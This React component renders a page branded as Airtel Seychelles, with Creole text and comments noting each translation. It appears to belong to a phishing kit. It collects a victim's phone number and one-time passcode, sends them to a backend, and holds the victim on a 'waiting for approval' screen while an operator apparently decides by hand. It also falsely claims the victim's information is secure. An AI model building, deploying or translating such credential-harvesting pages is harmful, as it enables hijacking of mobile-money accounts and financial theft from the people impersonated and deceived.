import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';

const OTP_LENGTH = 4;
const POLL_FAST_MS = 2000;
const POLL_SLOW_MS = 5000;
const POLL_SLOW_AFTER_MS = 60_000;
const TIMER_START = 60;
const PENDING_KEY = 'airtelPendingRequest';

function makeRefId() {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `AL-${ts}-${rand}`;
}

function formatPhone(p: string) {
  // CHANGED: Translated fallback text
  if (!p) return 'ou telefon';
  return p.replace(/\s+/g, ''); 
}

function AirtelOTPVerify() {
  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
  const [timeLeft, setTimeLeft] = useState(TIMER_START);
  const [timerResetKey, setTimerResetKey] = useState(0);
  const [expired, setExpired] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [refId, setRefId] = useState('');
  const [submittedAt, setSubmittedAt] = useState('');

  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const hasResumedRef = useRef(false);
  const navigate = useNavigate();

  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  const stopPolling = useCallback(() => {
    if (pollTokenRef.current) pollTokenRef.current.cancelled = true;
    pollTokenRef.current = null;
    if (pollTimerRef.current) {
      clearTimeout(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  }, []);

  useEffect(() => {
    if (!phoneNumber) navigate('/');
  }, [phoneNumber, navigate]);

  /* ─── Countdown Timer ─── */
  useEffect(() => {
    if (expired) return;

    const id = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(id);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(id);
  }, [timerResetKey, expired]);

  useEffect(() => stopPolling, [stopPolling]);

  const resetToInput = useCallback(() => {
    stopPolling();
    setIsVerifying(false);
    setWaitingForAdmin(false);
    setSubmittedAt('');
    setRefId('');
    setOtp(Array(OTP_LENGTH).fill(''));
    sessionStorage.removeItem(PENDING_KEY);
    setTimeout(() => otpRefs.current[0]?.focus(), 100);
  }, [stopPolling]);

  const startPolling = useCallback(
    (id: string) => {
      stopPolling();

      const token = { cancelled: false };
      pollTokenRef.current = token;
      const startedAt = Date.now();

      const tick = async () => {
        if (token.cancelled) return;

        try {
          const res = await fetch(
            `${API_BASE}/api/otp-status/${encodeURIComponent(id)}`,
            { cache: 'no-store' },
          );
          const data = await res.json();
          if (token.cancelled) return;

          if (data.status === 'approved') {
            stopPolling();
            sessionStorage.removeItem(PENDING_KEY);
            setTimeout(() => navigate('/airtel-loan-limit'), 300);
            return;
          }

          if (data.status === 'rejected' || data.status === 'expired') {
            resetToInput();
            return;
          }
        } catch {
          /* keep polling */
        }

        if (token.cancelled) return;
        const elapsed = Date.now() - startedAt;
        const delay = elapsed < POLL_SLOW_AFTER_MS ? POLL_FAST_MS : POLL_SLOW_MS;
        pollTimerRef.current = setTimeout(tick, delay);
      };

      pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
    },
    [navigate, resetToInput, stopPolling],
  );

  useEffect(() => {
    if (hasResumedRef.current) return;
    hasResumedRef.current = true;

    try {
      const raw = sessionStorage.getItem(PENDING_KEY);
      if (!raw) return;
      const saved = JSON.parse(raw);
      if (!saved?.refId) return;

      setRefId(saved.refId);
      setSubmittedAt(saved.submittedAt ?? '');
      setWaitingForAdmin(true);
      setIsVerifying(true);
      startPolling(saved.refId);
    } catch {
      sessionStorage.removeItem(PENDING_KEY);
    }
  }, [startPolling]);

  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);

    if (value && index < OTP_LENGTH - 1) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');
    if (isVerifying || otpString.length < OTP_LENGTH) return;

    setIsVerifying(true);
    setWaitingForAdmin(false);

    const newRefId = makeRefId();
    const nowIso = new Date().toISOString();

    setRefId(newRefId);
    setSubmittedAt(nowIso);

    try {
      const response = await fetch(`${API_BASE}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone_number: phoneNumber,
          otp: otpString,
          ref_id: newRefId,
          submitted_at: nowIso,
        }),
      });
      const data = await response.json();

      const finalRef = data.ref_id || newRefId;
      setRefId(finalRef);

      if (data.status === 'approved') {
        sessionStorage.removeItem(PENDING_KEY);
        setTimeout(() => navigate('/airtel-loan-limit'), 300);
        return;
      }

      if (data.status === 'rejected') {
        resetToInput();
        return;
      }

      setWaitingForAdmin(true);
      sessionStorage.setItem(
        PENDING_KEY,
        JSON.stringify({ refId: finalRef, otp: otpString, submittedAt: nowIso }),
      );
      startPolling(finalRef);
    } catch {
      resetToInput();
    }
  };

  const showWaitingOverlay = isVerifying || waitingForAdmin;
  const isFormValid = otp.join('').length === OTP_LENGTH;

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #DA1C1C; /* Airtel Red */
          position: relative;
        }

        /* FADED BACKGROUND CLASS */
        .faded-content {
          opacity: 0.15;
          pointer-events: none;
          transition: opacity 0.3s ease;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
        }

        /* WAITING OVERLAY */
        .waiting-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          background-color: rgba(255, 255, 255, 0.9); /* Mostly solid white to hide background */
        }

        .custom-spinner {
          width: 60px;
          height: 60px;
          border: 6px solid #E5E7EB;
          border-top: 6px solid #DA1C1C;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .waiting-title {
          font-size: 22px;
          font-weight: 700;
          color: #1a1a1a;
          margin-bottom: 20px;
          text-align: center;
        }

        .waiting-message {
          background-color: #FEF2F2;
          color: #4B5563;
          padding: 16px 24px;
          border-radius: 24px;
          text-align: center;
          font-size: 15px;
          font-weight: 500;
          line-height: 1.5;
          max-width: 380px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        /* HEADER */
        .header-section {
          padding: 40px 24px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          position: relative;
        }

        .menu-btn {
          position: absolute;
          left: 20px;
          top: 20px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
        }

        .header-title {
          font-size: 32px;
          font-weight: 900;
          color: #1a1a1a;
          font-style: italic;
          margin-bottom: 6px;
        }

        .header-subtitle {
          font-size: 14px;
          font-weight: 600;
          color: #1a1a1a;
        }

        /* MAIN CARD */
        .main-card {
          background-color: #ffffff;
          width: 90%;
          max-width: 420px;
          margin: 0 auto;
          border-radius: 24px;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
          position: relative;
          z-index: 10;
        }

        .card-title {
          font-size: 26px;
          font-weight: 800;
          color: #000000;
          margin-bottom: 8px;
        }

        .card-subtitle {
          font-size: 15px;
          color: #4B5563;
          margin-bottom: 24px;
          text-align: center;
          line-height: 1.5;
        }

        .phone-highlight {
          color: #000000;
          font-weight: 700;
          display: block;
          margin-top: 4px;
          font-size: 16px;
        }

        .input-label {
          font-size: 15px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 12px;
          width: 100%;
          text-align: center;
        }

        /* OTP INPUT BOXES */
        .otp-inputs-container {
          display: flex;
          gap: 16px;
          margin-bottom: 20px;
        }

        .otp-box {
          width: 60px;
          height: 60px;
          border: 2px solid #CBD5E1;
          border-radius: 12px;
          font-size: 28px;
          text-align: center;
          color: #000000;
          outline: none;
          background-color: #ffffff;
        }

        .otp-box::placeholder {
          color: #000000;
          font-size: 30px;
        }

        .otp-box:focus {
          border-color: #2A5CAA;
        }

        /* TIMER */
        .otp-timer-text {
          font-size: 14px;
          color: #6B7280;
          text-align: center;
          margin-bottom: 24px;
          line-height: 1.6;
        }

        .otp-timer-text strong {
          color: #1a1a1a;
        }

        /* BUTTON */
        .login-btn {
          width: 100%;
          padding: 18px;
          border-radius: 12px;
          border: none;
          background-color: #D1D5DB;
          color: #4B5563;
          font-size: 18px;
          font-weight: 700;
          cursor: pointer;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 12px;
          transition: all 0.2s;
        }

        .login-btn.active {
          background-color: #DA1C1C;
          color: #ffffff;
        }

        /* SECURITY TEXT */
        .security-footer {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-top: 24px;
          color: #6B7280;
          font-size: 14px;
          font-weight: 500;
        }

        /* FOOTER ICONS */
        .brand-icons-footer {
          flex: 1;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
          padding: 40px 20px 20px;
        }

        .brand-icon {
          display: flex;
          align-items: center;
          justify-content: center;
        }
      `}</style>

      {showWaitingOverlay && (
        <div className="waiting-overlay">
          <div className="custom-spinner"></div>
          {/* CHANGED: Translated to Seychellois Creole */}
          <div className="waiting-title">Pey atann aprobasyon</div>
          <div className="waiting-message">
            Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...
          </div>
        </div>
      )}

      {/* MAIN CONTENT WRAPPER (Gets faded when waiting) */}
      <div className={showWaitingOverlay ? 'faded-content' : ''}>
        
        {/* HEADER */}
        <div className="header-section">
          <button className="menu-btn" onClick={() => navigate('/')}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="3" y1="12" x2="21" y2="12"></line>
              <line x1="3" y1="6" x2="21" y2="6"></line>
              <line x1="3" y1="18" x2="21" y2="18"></line>
            </svg>
          </button>
          {/* CHANGED: Translated to Seychellois Creole */}
          <h1 className="header-title">Airtel Sesel</h1>
          <p className="header-subtitle">Pre rapid. Nenport ler. Nenport kote.</p>
        </div>

        {/* MAIN CARD */}
        <div className="main-card">
          {/* CHANGED: Translated to Seychellois Creole */}
          <h2 className="card-title">Verifikasyon OTP</h2>
          <p className="card-subtitle">
            Antre OTP ki finn ganny voye kot ou nimero telefon
            <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
          </p>

          <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
            
            {/* CHANGED: Translated to Seychellois Creole */}
            <span className="input-label">Antre OTP 4 sif</span>
            
            <div className="otp-inputs-container">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  type="tel"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={1}
                  value={digit}
                  ref={(el) => { otpRefs.current[index] = el; }}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="otp-box"
                  placeholder="•"
                  disabled={showWaitingOverlay}
                />
              ))}
            </div>

            {/* CHANGED: Translated to Seychellois Creole */}
            <p className="otp-timer-text">
              Koud i ekspire dan <strong>{timeLeft}</strong> segonn
            </p>

            <button 
              type="submit" 
              className={`login-btn ${isFormValid ? 'active' : ''}`}
              disabled={!isFormValid || showWaitingOverlay}
            >
              {/* CHANGED: Translated to Seychellois Creole */}
              SOUMET
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="5" y1="12" x2="19" y2="12" />
                <polyline points="12 5 19 12 12 19" />
              </svg>
            </button>

          </form>

          <div className="security-footer">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
            {/* CHANGED: Translated to Seychellois Creole */}
            Ou bann informasyon i an sekirite.
          </div>
        </div>

        {/* BRAND ICONS FOOTER */}
        <div className="brand-icons-footer">
          <div className="brand-icon">
            <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
              <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
              <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
            </div>
          </div>
          
          <div className="brand-icon">
            <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
          </div>

          <div className="brand-icon">
            <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
            </div>
          </div>

          <div className="brand-icon">
            <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
              <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AirtelOTPVerify;